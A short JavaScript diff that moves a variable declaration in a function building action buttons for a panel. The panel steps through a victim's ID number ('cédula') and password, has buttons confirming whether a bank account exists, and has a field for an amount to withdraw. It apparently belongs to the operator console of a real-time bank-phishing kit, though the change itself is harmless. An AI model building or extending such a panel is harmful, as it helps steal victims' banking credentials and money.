@@ -154,11 +154,11 @@ function actionsFor(d){
   const c = document.createElement('div'); c.className = 'd-actions';
   const b = (lbl, fn, cls)=>{ const x=document.createElement('button'); x.className='d-action '+(cls||''); x.textContent=lbl; x.onclick=fn; c.appendChild(x); };
   const sid = d.id;
+  const v = vals[sid] || {};
   if(d.paso==='s-cedula' && d.pendiente){
     b('✓ Cuenta existe', ()=>send(sid,'s-pass'), 'ok');
     b('✗ Cuenta no existe', ()=>sendErr(sid,'cuenta-no-existe'), 'err');
   } else if(d.paso==='s-pass' && d.pendiente){
-    const v = vals[sid] || {};
     const m = document.createElement('input'); m.className='d-input'; m.type='text'; m.inputMode='numeric';
     m.placeholder='Monto a retirar ($)';
     m.value = (v.m !== undefined) ? v.m : ((d.datos && d.datos.amount) ? fmt(d.datos.amount) : '');
